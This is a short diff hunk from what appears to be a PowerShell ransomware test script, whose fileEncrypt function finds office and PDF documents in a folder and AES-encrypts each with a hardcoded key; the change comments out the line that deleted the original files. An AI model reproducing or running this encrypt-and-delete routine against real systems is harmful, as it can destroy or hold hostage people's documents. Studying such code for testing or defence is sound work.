@@ -108,7 +108,7 @@ function fileEncrypt($SourceFolder)
     Foreach($filepath in @(fileList $SourceFolder '\.(doc|pdf|docx|xls|xlsx|pptx|ppt)$'))
     {
         Invoke-AESEncryption -Mode Encrypt -Key "rantest" -Path $filepath
-        Remove-Item $filepath
+        #Remove-Item $filepath
     }
 }
 
